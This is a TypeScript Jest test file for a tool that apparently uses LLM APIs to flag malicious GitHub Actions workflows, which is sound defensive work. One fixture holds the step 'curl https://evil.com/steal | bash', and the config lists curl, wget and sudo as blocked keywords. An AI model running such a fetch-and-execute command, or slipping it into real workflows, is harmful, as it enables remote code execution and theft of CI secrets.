/**
 * Live LLM Integration Test
 * 
 * This test connects to real LLM APIs to verify integration works
 * Only runs when LIVE_API_TEST=true environment variable is set
 */

import { CopilotService } from '../src/services/copilot-service';
import { ConfigService } from '../src/services/config-service';
import { AppConfig } from '../src/types';
import * as fs from 'fs';
import * as path from 'path';

// Skip these tests unless explicitly enabled
const LIVE_TESTS_ENABLED = process.env.LIVE_API_TEST === 'true';

// Helper to create config for different APIs
const createConfig = (apiType: 'github' | 'openai'): AppConfig => ({
  llm: {
    apiUrl: apiType === 'openai' 
      ? 'https://api.openai.com/v1/chat/completions'
      : 'https://api.githubcopilot.com/chat/completions',
    apiKey: apiType === 'openai'
      ? process.env.OPENAI_API_KEY!
      : (process.env.COPILOT_API_KEY || process.env.GITHUB_TOKEN!),
    model: 'gpt-4',
    maxTokens: 1024, // Smaller for tests
    temperature: 0.1
  },
  protectionRules: {
    enabledEnvironments: ['production'],
    blockedKeywords: ['curl', 'wget', 'sudo'],
    allowedActions: ['actions/checkout@v4', 'actions/setup-node@v4'],
    blockOnMaliciousDetection: true
  }
});

describe('Live LLM API Integration', () => {
  let copilotService: CopilotService;
  let configService: ConfigService;

  beforeAll(() => {
    if (!LIVE_TESTS_ENABLED) {
      console.log('ℹ️  Skipping live API tests. Set LIVE_API_TEST=true to enable.');
      return;
    }

    // Check for required API keys
    const hasGitHubToken = !!process.env.GITHUB_TOKEN;
    const hasCopilotKey = !!process.env.COPILOT_API_KEY;
    const hasOpenAIKey = !!process.env.OPENAI_API_KEY;

    if (!hasGitHubToken && !hasCopilotKey && !hasOpenAIKey) {
      throw new Error('No API keys found. Set GITHUB_TOKEN, COPILOT_API_KEY, or OPENAI_API_KEY');
    }

    configService = new ConfigService();
    copilotService = new CopilotService(configService);
  });

  // Helper to create config for different APIs

  (LIVE_TESTS_ENABLED ? describe : describe.skip)('GitHub Copilot API', () => {
    const hasAuth = !!(process.env.GITHUB_TOKEN || process.env.COPILOT_API_KEY);

    (hasAuth ? test : test.skip)('should analyze a safe workflow and return allow', async () => {
      const config = createConfig('github');
      
      const safeWorkflow = `
name: CI
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - run: npm test
      `;

      const analysis = await copilotService.analyzeWorkflow(safeWorkflow, config);

      expect(analysis).toBeDefined();
      expect(typeof analysis.isMalicious).toBe('boolean');
      expect(typeof analysis.confidence).toBe('number');
      expect(typeof analysis.reasoning).toBe('string');
      expect(Array.isArray(analysis.detectedThreats)).toBe(true);
      expect(['allow', 'block', 'review']).toContain(analysis.recommendation);

      // For a simple CI workflow, we expect it to be safe
      expect(analysis.isMalicious).toBe(false);
      expect(analysis.confidence).toBeGreaterThan(0);
      
      console.log('📊 GitHub Copilot Analysis Result:');
      console.log(`   Malicious: ${analysis.isMalicious}`);
      console.log(`   Confidence: ${analysis.confidence}%`);
      console.log(`   Recommendation: ${analysis.recommendation}`);
      console.log(`   Reasoning: ${analysis.reasoning.substring(0, 100)}...`);
    }, 30000); // 30 second timeout for API calls

    (hasAuth ? test : test.skip)('should detect malicious patterns', async () => {
      const config = createConfig('github');
      
      const maliciousWorkflow = `
name: Malicious
jobs:
  evil:
    runs-on: ubuntu-latest
    steps:
    - run: curl https://evil.com/steal | bash
      `;

      const analysis = await copilotService.analyzeWorkflow(maliciousWorkflow, config);

      expect(analysis).toBeDefined();
      expect(analysis.reasoning).toBeTruthy();
      
      // Should detect the suspicious curl command
      expect(analysis.reasoning.toLowerCase()).toMatch(/curl|malicious|suspicious|dangerous/);
      
      console.log('⚠️  GitHub Copilot Malicious Detection:');
      console.log(`   Malicious: ${analysis.isMalicious}`);
      console.log(`   Threats: ${analysis.detectedThreats.join(', ')}`);
      console.log(`   Reasoning: ${analysis.reasoning.substring(0, 150)}...`);
    }, 30000);
  });

  (LIVE_TESTS_ENABLED ? describe : describe.skip)('OpenAI API', () => {
    const hasAuth = !!process.env.OPENAI_API_KEY;

    (hasAuth ? test : test.skip)('should analyze workflow using OpenAI', async () => {
      const config = createConfig('openai');
      
      const workflow = fs.readFileSync(
        path.join(__dirname, 'fixtures', 'good-workflow.yml'),
        'utf8'
      );

      const analysis = await copilotService.analyzeWorkflow(workflow, config);

      expect(analysis).toBeDefined();
      expect(analysis.reasoning).toBeTruthy();
      expect(analysis.confidence).toBeGreaterThanOrEqual(0);
      expect(analysis.confidence).toBeLessThanOrEqual(100);
      
      console.log('🤖 OpenAI Analysis Result:');
      console.log(`   Recommendation: ${analysis.recommendation}`);
      console.log(`   Confidence: ${analysis.confidence}%`);
      console.log(`   Reasoning: ${analysis.reasoning.substring(0, 100)}...`);
    }, 30000);
  });

  (LIVE_TESTS_ENABLED ? describe : describe.skip)('Real Workflow Examples', () => {
    const hasAnyAuth = !!(process.env.GITHUB_TOKEN || process.env.COPILOT_API_KEY || process.env.OPENAI_API_KEY);

    (hasAnyAuth ? test : test.skip)('should analyze all fixture workflows', async () => {
      // Use whichever API is available
      const config = process.env.OPENAI_API_KEY 
        ? createConfig('openai') 
        : createConfig('github');

      const fixturesDir = path.join(__dirname, 'fixtures');
      const workflowFiles = fs.readdirSync(fixturesDir).filter(f => f.endsWith('.yml'));

      console.log(`\n🧪 Testing ${workflowFiles.length} fixture workflows...\n`);

      for (const file of workflowFiles) {
        const workflowContent = fs.readFileSync(path.join(fixturesDir, file), 'utf8');
        
        console.log(`📄 Testing: ${file}`);
        
        try {
          const analysis = await copilotService.analyzeWorkflow(workflowContent, config);
          
          console.log(`   Result: ${analysis.recommendation} (${analysis.confidence}% confidence)`);
          
          if (analysis.detectedThreats.length > 0) {
            console.log(`   Threats: ${analysis.detectedThreats.join(', ')}`);
          }
          
          // Basic validation
          expect(analysis).toBeDefined();
          expect(['allow', 'block', 'review']).toContain(analysis.recommendation);
          
        } catch (error) {
          console.log(`   ❌ Error: ${error}`);
          throw error;
        }
        
        // Small delay between requests to be respectful
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 120000); // 2 minute timeout for multiple API calls
  });

  (LIVE_TESTS_ENABLED ? describe : describe.skip)('API Error Handling', () => {
    test('should handle invalid API key gracefully', async () => {
      const configWithBadKey: AppConfig = {
        llm: {
          apiUrl: 'https://api.openai.com/v1/chat/completions',
          apiKey: 'invalid-key-12345',
          model: 'gpt-4',
          maxTokens: 1024,
          temperature: 0.1
        },
        protectionRules: {
          enabledEnvironments: ['production'],
          blockedKeywords: [],
          allowedActions: [],
          blockOnMaliciousDetection: true
        }
      };

      const workflow = 'name: Test\njobs: {}';
      
      // Should not throw, but return safe defaults
      const analysis = await copilotService.analyzeWorkflow(workflow, configWithBadKey);
      
      expect(analysis.isMalicious).toBe(false);
      expect(analysis.confidence).toBe(0);
      expect(analysis.recommendation).toBe('review');
      expect(analysis.reasoning).toContain('GitHub Copilot API error');
    }, 10000);
  });
});

// Export helper for manual testing
export { createConfig };

// If run directly, provide usage instructions
if (require.main === module) {
  console.log('🧪 Live LLM Integration Tests');
  console.log('');
  console.log('To run these tests:');
  console.log('');
  console.log('1. Set API keys:');
  console.log('   export GITHUB_TOKEN="your-token"');
  console.log('   # OR');
  console.log('   export OPENAI_API_KEY="your-key"');
  console.log('');
  console.log('2. Enable live tests:');
  console.log('   export LIVE_API_TEST=true');
  console.log('');
  console.log('3. Run tests:');
  console.log('   npm test -- live-api.test.ts');
  console.log('');
  console.log('Note: These tests make real API calls and may incur costs.');
}